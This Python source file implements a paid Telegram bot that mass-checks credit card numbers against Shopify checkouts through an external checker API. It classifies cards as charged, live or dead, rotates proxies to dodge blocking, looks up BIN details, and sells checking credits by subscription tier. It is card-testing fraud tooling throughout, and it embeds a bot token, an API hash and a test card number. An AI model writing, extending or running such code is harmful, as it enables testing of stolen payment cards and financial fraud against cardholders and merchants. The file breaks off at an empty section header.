from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'

# ⚠️ SECURITY: Move these to environment variables in production!
API_ID = 33552520
API_HASH = 'd82affa92dd5a1dbaa3087aa19a732f2'
BOT_TOKEN = '8860585696:AAEJ2uLV2Dce9HFGhpNDNZFXfJrUqnSU3s4'

ADMIN_IDS = [7132150988]
PVT_CHANNEL_ID = -1002200268580

# Required channels to join
REQUIRED_CHATS = [
    {"link": "https://t.me/dududadadee", "id": None},
]

# Premium Plans with Credits
PLANS = {
    "trial": {"days": 1, "credits": 3000, "price": "2$", "name": "🏅 TRIAL"},
    "bronze": {"days": 3, "credits": 8000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 14000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 20000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 30000, "price": "22$", "name": "🏆 PLATINUM"},
}

# File paths
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
GROUP_SETTINGS_FILE = 'group_settings.json'
USER_PROXIES_FILE = 'user_proxies.json'
HIT_STATS_FILE = 'hit_stats.json'
REFERRAL_FILE = 'referrals.json'

# Site filter presets
SITE_FILTERS = {
    "all": {"name": "🌍 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

# Constants
RATE_LIMIT_SECONDS = 3
CREDITS_LOW_THRESHOLD = 100
REFERRAL_REWARD = 200

# Global state
ACTIVE_FILTER = "all"
active_sessions = {}
_rate_limit_cache = {}
_user_active_sessions = {}
joined_users = set()

# Async file lock
_file_lock = asyncio.Lock()

# ========== DEAD SITE INDICATORS (global - single source of truth) ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'invalid proxy format', 'no proxy',
    'not found', 'merchant not found', 'shop not found',
    '404', 'connection refused', 'connection reset',
    'no route to host', 'name not resolved', 'cannot connect',
    'site error', 'internal server error', 'bad gateway',
    'service unavailable',
)

# ========== BOT CLIENT ==========
bot = TelegramClient('hexaxshchkrx_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ========== CREDITS SYSTEM ==========
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[ERROR] load_credits: {e}")
        return {}

def save_credits(credits_data):
    try:
        with open(CREDITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(credits_data, f, indent=4)
    except IOError as e:
        print(f"[ERROR] save_credits: {e}")

def get_user_credits(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    if uid not in credits_data:
        credits_data[uid] = 0
        save_credits(credits_data)
        return 0
    return credits_data.get(uid, 0)

def add_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    credits_data[uid] = credits_data.get(uid, 0) + amount
    save_credits(credits_data)
    return True

def remove_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    new_amount = max(0, current - amount)
    credits_data[uid] = new_amount
    save_credits(credits_data)
    return True

def deduct_credit(user_id):
    """Deduct 1 credit from user. Returns (success, remaining_credits)"""
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    if current >= 1:
        credits_data[uid] = current - 1
        save_credits(credits_data)
        return True, credits_data[uid]
    return False, current

# ========== CREDIT KEYS SYSTEM ==========
def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[ERROR] load_credit_keys: {e}")
        return {}

def save_credit_keys(keys_data):
    try:
        with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except IOError as e:
        print(f"[ERROR] save_credit_keys: {e}")

def generate_credit_key(amount):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {
        'credits': amount,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_credit_keys(keys_data)
    return key

def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data:
        return False, "Invalid credit key"
    if keys_data[key]['used']:
        return False, "Key already used"
    
    credits = keys_data[key]['credits']
    add_credits(user_id, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    
    return True, credits

# ========== PREMIUM KEYS SYSTEM ==========
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[ERROR] load_keys: {e}")
        return {}

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except IOError as e:
        print(f"[ERROR] save_keys: {e}")

def generate_premium_key(plan_key, days, credits):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {
        'type': 'premium',
        'plan': plan_key,
        'days': days,
        'credits': credits,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_keys(keys_data)
    return key

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[ERROR] load_premium_users: {e}")
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except IOError as e:
        print(f"[ERROR] save_premium_users: {e}")

def is_premium(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return False
    try:
        expiry = datetime.fromisoformat(user_data['expiry'])
        if datetime.now() > expiry:
            del premium_data[str(user_id)]
            save_premium_users(premium_data)
            return False
        return True
    except (ValueError, KeyError):
        return False

def get_user_plan_name(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return "FREE"
    plan_key = user_data.get('plan_key', '')
    if plan_key and plan_key in PLANS:
        return PLANS[plan_key]['name']
    return "CUSTOM"

def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    expiry = datetime.now() + timedelta(days=days)
    premium_data[str(user_id)] = {
        'expiry': expiry.isoformat(),
        'added_at': datetime.now().isoformat(),
        'days': days,
        'credits': credits,
        'plan_key': plan_key
    }
    save_premium_users(premium_data)
    add_credits(user_id, credits)

def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data:
        return False, "Invalid premium key"
    if keys_data[key]['used']:
        return False, "Key already used"
    if is_premium(user_id):
        return False, "You already have premium access"
    
    days = keys_data[key]['days']
    credits = keys_data[key]['credits']
    plan_key = keys_data[key]['plan']
    
    add_premium_user(user_id, plan_key, days, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    
    if plan_key == 'custom':
        return True, f"Redeemed custom premium: {days} days + {credits} credits!"
    else:
        return True, f"Redeemed {PLANS[plan_key]['name']} plan! {days} days + {credits} credits!"

# ========== RESOLVE CHAT IDs ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== CHECK IF USER JOINED ALL ==========
async def check_user_joined(user_id):
    """Check if user joined required chats"""
    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            await bot.get_permissions(chat["id"], user_id)
        except Exception:
            missing_chats.append(chat["link"])
    if missing_chats:
        return False, missing_chats
    return True, None

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_banned_users():
    return get_file_lines(BANNED_FILE)

def is_banned(user_id):
    banned = load_banned_users()
    return str(user_id) in banned

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned_users()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned:
                f.write(f"{uid}\n")

# ========== GROUP SETTINGS SYSTEM ==========
def load_group_settings():
    if not os.path.exists(GROUP_SETTINGS_FILE):
        return {}
    try:
        with open(GROUP_SETTINGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def save_group_settings(settings_data):
    try:
        with open(GROUP_SETTINGS_FILE, 'w', encoding='utf-8') as f:
            json.dump(settings_data, f, indent=4)
    except IOError:
        pass

def is_group_enabled(chat_id):
    settings = load_group_settings()
    return settings.get(str(chat_id), False)

def set_group_enabled(chat_id, enabled):
    settings = load_group_settings()
    settings[str(chat_id)] = enabled
    save_group_settings(settings)
    return True

# ========== USER PROXIES SYSTEM ==========
def load_user_proxies():
    if not os.path.exists(USER_PROXIES_FILE):
        return {}
    try:
        with open(USER_PROXIES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def save_user_proxies(proxies_data):
    try:
        with open(USER_PROXIES_FILE, 'w', encoding='utf-8') as f:
            json.dump(proxies_data, f, indent=4)
    except IOError:
        pass

def get_user_specific_proxies(user_id):
    proxies_data = load_user_proxies()
    return proxies_data.get(str(user_id), [])

def add_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid not in proxies_data:
        proxies_data[uid] = []
    if proxy not in proxies_data[uid]:
        proxies_data[uid].append(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def remove_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxy in proxies_data[uid]:
        proxies_data[uid].remove(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def clear_user_proxies(user_id):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxies_data[uid]:
        proxies_data[uid] = []
        save_user_proxies(proxies_data)
        return True
    return False

# ========== HIT STATS SYSTEM ==========
def load_hit_stats():
    if not os.path.exists(HIT_STATS_FILE):
        return {}
    try:
        with open(HIT_STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def save_hit_stats(data):
    try:
        with open(HIT_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except IOError:
        pass

def record_hit(user_id, hit_type):
    """hit_type: 'charged' or 'approved'"""
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid][hit_type] = data[uid].get(hit_type, 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)

def record_dead(user_id):
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid]['dead'] = data[uid].get('dead', 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)

# ========== RATE LIMIT HELPER ==========
def check_rate_limit(user_id):
    """Returns (allowed, seconds_remaining)"""
    now = time.time()
    last = _rate_limit_cache.get(user_id, 0)
    diff = now - last
    if diff < RATE_LIMIT_SECONDS:
        return False, round(RATE_LIMIT_SECONDS - diff, 1)
    _rate_limit_cache[user_id] = now
    return True, 0

# ========== REFERRAL SYSTEM ==========
def load_referrals():
    if not os.path.exists(REFERRAL_FILE):
        return {}
    try:
        with open(REFERRAL_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def save_referrals(data):
    try:
        with open(REFERRAL_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except IOError:
        pass

def get_referral_code(user_id):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data:
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        data[uid] = {'code': code, 'referred': [], 'total_earned': 0}
        save_referrals(data)
    return data[uid]['code']

def process_referral(new_user_id, ref_code):
    """Returns (success, referrer_id)"""
    data = load_referrals()
    new_uid = str(new_user_id)
    # Check if already referred
    for uid, info in data.items():
        if new_uid in info.get('referred', []):
            return False, None
    # Find referrer
    for uid, info in data.items():
        if info.get('code') == ref_code and uid != new_uid:
            info['referred'].append(new_uid)
            info['total_earned'] = info.get('total_earned', 0) + REFERRAL_REWARD
            save_referrals(data)
            add_credits(int(uid), REFERRAL_REWARD)
            return True, int(uid)
    return False, None

# ========== CREDITS LOW WARNING ==========
async def check_credits_low(user_id):
    """Send warning if credits drop below threshold"""
    credits = get_user_credits(user_id)
    if 0 < credits < CREDITS_LOW_THRESHOLD:
        try:
            await bot.send_message(user_id, 
                f"⚠️ <b>Low Credits Warning!</b>\n\n"
                f"💰 You only have <b>{credits} credits</b> remaining.\n"
                f"Use /redeemcredit KEY to add more credits.\n"
                f"Contact @Mydev1 to purchase credits."
            , parse_mode='html')
        except Exception:
            pass

# ========== SITE & PROXY LOADERS ==========
def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True, "Site added successfully"

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False, "Site not found"
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True, "Site removed successfully"

# ========== CARD HELPERS ==========
def clean_card(card_text):
    """Clean card string from extra characters"""
    if not card_text:
        return ""
    card = card_text.strip()
    card = re.sub(r'[\/\s,\-]+', '|', card)
    return card

def validate_card_format(card_text):
    """Validate card format: xxxxxxxxxxxxxxxx|MM|YY|CVV"""
    parts = card_text.split('|')
    if len(parts) != 4:
        return False, "Invalid format. Use: card|mm|yy|cvv"
    
    card_num = parts[0].strip()
    mm = parts[1].strip()
    yy = parts[2].strip()
    cvv = parts[3].strip()
    
    card_num = re.sub(r'[\s\-]', '', card_num)
    if not card_num.isdigit() or len(card_num) < 13 or len(card_num) > 19:
        return False, f"Invalid card number length: {len(card_num)} digits"
    
    if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
        return False, f"Invalid month: {mm}"
    mm = mm.zfill(2)
    
    if not yy.isdigit():
        return False, f"Invalid year: {yy}"
    if len(yy) == 2:
        yy = '20' + yy
    if len(yy) != 4:
        return False, f"Invalid year format: {yy}"
    
    if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
        return False, f"Invalid CVV: {cvv}"
    
    try:
        exp_date = datetime(int(yy), int(mm), 1)
        today = datetime.now().replace(day=1)
        if exp_date < today:
            return False, "Card is expired"
    except ValueError:
        return False, "Invalid expiry date"
    
    clean = f"{card_num}|{mm}|{yy}|{cvv}"
    return True, clean

def extract_cc(text):
    """Extract credit cards from text using regex"""
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def validate_cards_bulk(text):
    """Parse multiple cards from text/file content"""
    lines = text.strip().split('\n')
    valid_cards = []
    errors = []
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        card_text = clean_card(line)
        is_valid, result = validate_card_format(card_text)
        if is_valid:
            valid_cards.append(result)
        else:
            errors.append(f"{line[:30]}... -> {result}")
    
    return valid_cards, errors

# ========== BIN LOOKUP (Single unified function) ==========
async def get_bin_info(bin_num):
    """Get BIN information from API"""
    brand = "N/A"
    bin_type = "N/A"
    level = "N/A"
    bank = "N/A"
    country = "N/A"
    flag = "🏳️"
    
    if not bin_num or len(bin_num) < 6:
        return brand, bin_type, level, bank, country, flag
    
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://bins.antipublic.cc/bins/{bin_num}"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    brand = data.get('brand', 'N/A')
                    bin_type = data.get('type', 'N/A')
                    level = data.get('level', 'N/A')
                    bank = data.get('bank', 'N/A')
                    country_name = data.get('country_name', 'N/A')
                    country_code = data.get('country', '').upper()
                    country = f"{country_name} ({country_code})" if country_code else country_name
                    flag = data.get('flag', data.get('country_flag', '🏳️'))
    except Exception:
        pass
    
    return brand, bin_type, level, bank, country, flag

# ========== DEAD SITE CHECK (Single unified function) ==========
def is_dead_site_error(error_msg):
    """Check if error indicates a dead site (should remove)"""
    if not error_msg:
        return False
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

# ========== CARD CHECKING (API) - Unified ==========
async def check_card(card, site, proxy=None):
    """
    Check a single card on a single site using the checker API.
    Uses GET method with params (matching the actual API contract).
    """
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Dead', 'message': 'Invalid card format', 'card': card, 'gateway': 'Unknown', 'price': '-'}

        params = {'cc': card, 'site': site}
        if proxy:
            params['proxy'] = proxy

        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', raw.get('msg', ''))
        price = raw.get('Price', raw.get('price', '-'))
        gate = raw.get('Gate', raw.get('gateway', 'Shopify Payments'))
        status = raw.get('Status', raw.get('status', ''))

        # Check for site errors first
        if is_dead_site_error(response_msg):
            return {
                'status': 'Site Error',
                'message': response_msg,
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        response_lower = response_msg.lower()

        # CHARGED hits (highest priority)
        if (status == 'Charged' or status == 'charged' or
            'order completed' in response_lower or
            'order_placed' in response_lower or
            'ORDER_PLACED' in response_msg or
            'thank you' in response_lower or
            'payment successful' in response_lower):
            return {
                'status': 'Charged',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price
            }

        # Cloudflare bypass failed - site error
        if 'cloudflare bypass failed' in response_lower:
            return {
                'status': 'Site Error',
                'message': 'Cloudflare spotted',
                'card': card,
                'retry': True,
                'gateway': gate,
                'price': price,
                'site': site
            }

        # APPROVED / LIVE hits
        if (status == 'Approved' or status == 'approved' or status == 'live' or
            any(key in response_lower for key in [
                'approved', 'success', 'insufficient_funds', 'insufficient funds',
                'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
                'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
                'incorrect_zip', 'incorrect zip'
            ])):
            return {
                'status': 'Approved',
                'message': response_msg,
                'card': card,
                'site': site,
                'gateway': gate,
                'price': price
            }

        # Everything else is DEAD
        return {
            'status': 'Dead',
            'message': response_msg,
            'card': card,
            'site': site,
            'gateway': gate,
            'price': price
        }

    except asyncio.TimeoutError:
        return {
            'status': 'Site Error',
            'message': 'Request timeout',
            'card': card,
            'retry': True,
            'gateway': 'Unknown',
            'price': '-'
        }
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {
                'status': 'Site Error',
                'message': error_msg,
                'card': card,
                'retry': True,
                'gateway': 'Unknown',
                'price': '-'
            }
        return {
            'status': 'Dead',
            'message': error_msg,
            'card': card,
            'gateway': 'Unknown',
            'price': '-'
        }

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    """Check a card with automatic retry on site errors"""
    last_result = None
    
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {
            'status': 'Dead',
            'message': f"Site errors: {last_result['message']}",
            'card': card,
            'gateway': last_result.get('gateway', 'Unknown'),
            'price': last_result.get('price', '-'),
            'site': 'Multiple'
        }

    return {
        'status': 'Dead',
        'message': 'Max retries exceeded',
        'card': card,
        'gateway': 'Unknown',
        'price': '-'
    }

# ========== TEST HELPERS ==========
async def test_site(site, proxy):
    """Test if a site is alive"""
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except Exception:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    """Test if a proxy is working"""
    test_card = "5154623245618097|03|2032|156"
    test_site_url = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'site': test_site_url, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        else:
            return {'proxy': proxy, 'status': 'alive'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

# ======================================================================
# PART 2: COMMAND HANDLERS & BOT STARTUP
# ======================================================================

# ========== SEND REAL-TIME HIT NOTIFICATION TO USER ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    """Send real-time hit notification to user"""
    
    if hit_type == "CHARGED":
        status_emoji = "💣"
        status_text = "Charged"
    else:
        status_emoji = "✅"
        status_text = "Live"
    
    # Get BIN Info
    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)
    
    message = (
        f"<b>🔥 #SHOPIFY</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ Hit Found!</b>\n"
        f"<blockquote>{status_emoji} Status: {status_text}</blockquote>\n"
        f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        f"<blockquote>📝 Response: {response_msg[:150]}</blockquote>\n"
        f"<blockquote>✅ Gateway: ✅ {gateway} | 💰 {price}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ BIN Info</b>\n"
        f"<pre>BIN Info: {brand} - {bin_type} - {level}\n"
        f"Bank: {bank}\n"
        f"Country: {country} {flag}</pre>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    try:
        await bot.send_message(user_id, message, parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOGS (ONLY CHARGED HITS) ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id):
    """Send log to PVT channel - ONLY for CHARGED hits"""
    header = "💣 CHARGED HIT 💣"
    
    if username:
        user_display = username
    else:
        user_display = str(user_id)
    
    plan_name = get_user_plan_name(user_id)
    
    log_message = (
        f"<b>{header}</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>Response:</b> {response_msg[:100]}\n"
        f"<b>Gateway:</b> {gateway}\n"
        f"<b>Price:</b> {price}\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'<b>User:</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)'
    )
    
    try:
        await bot.send_message(PVT_CHANNEL_ID, log_message, parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== FORMAT RESULTS ==========
def format_cc_result(card, results, user_id):
    """Format single card check result for /cc command"""
    plan_name = get_user_plan_name(user_id)
    
    if not results.get("valid"):
        return results.get("msg", "Check failed")
    
    text = (
        f"<b>🔥 CHECK RESULT</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        f"<blockquote>💣 Charged: {len(results['charged'])} | ✅ Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    # Show CHARGED hits (detailed)
    if results['charged']:
        text += "\n<b>💣 CHARGED HITS:</b>"
        for r in results['charged']:
            text += (
                f"\n<blockquote>💣 Card: <code>{r['card']}</code>\n"
                f"✅ Gateway: {r['gateway']}\n"
                f"💰 Price: {r['price']}\n"
                f"📝 Response: {str(r['result'].get('msg', 'N/A'))[:80]}</blockquote>"
            )
    
    # Show LIVE hits
    if results['approved']:
        text += f"\n<b>✅ LIVE ({len(results['approved'])}):</b>"
        shown = 0
        for r in results['approved'][:5]:
            text += f"\n<blockquote>✅ <code>{r['card']}</code> | {r['gateway']}</blockquote>"
            shown += 1
        if len(results['approved']) > shown:
            text += f"\n<blockquote>... and {len(results['approved']) - shown} more</blockquote>"
    
    text += (
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    return text

def format_chk_result_summary(results, file_name, user_id):
    """Format mass check results summary"""
    charged_count = len(results['charged'])
    approved_count = len(results['approved'])
    dead_count = len(results['dead'])
    total = results['total']
    
    text = (
        f"<b>🔥 MASS CHECK RESULT</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<blockquote>✅ File: {file_name}\n"
        f"🔢 Total: {total}\n"
        f"💣 Charged: {charged_count}\n"
        f"✅ Live: {approved_count}\n"
        f"❌ Dead: {dead_count}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    # Show CHARGED hits
    if results['charged']:
        text += "\n<b>💣 CHARGED HITS:</b>"
        for r in results['charged']:
            text += (
                f"\n<blockquote>💣 <code>{r['card']}</code>\n"
                f"✅ {r['gateway']} | 💰 {r['price']}\n"
                f"📝 {str(r['result'].get('msg', 'N/A'))[:80]}</blockquote>"
            )
    
    # Show some LIVE hits
    if results['approved']:
        text += f"\n<b>✅ LIVE HITS ({approved_count}):</b>"
        for r in results['approved'][:10]:
            text += f"\n<blockquote>✅ <code>{r['card']}</code> | {r['gateway']} | {r['price']}</blockquote>"
        if approved_count > 10:
            text += f"\n<blockquote>... and {approved_count - 10} more live cards</blockquote>"
    
    text += (
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    return text

# ========== SAVE HIT RESULTS TO FILE ==========
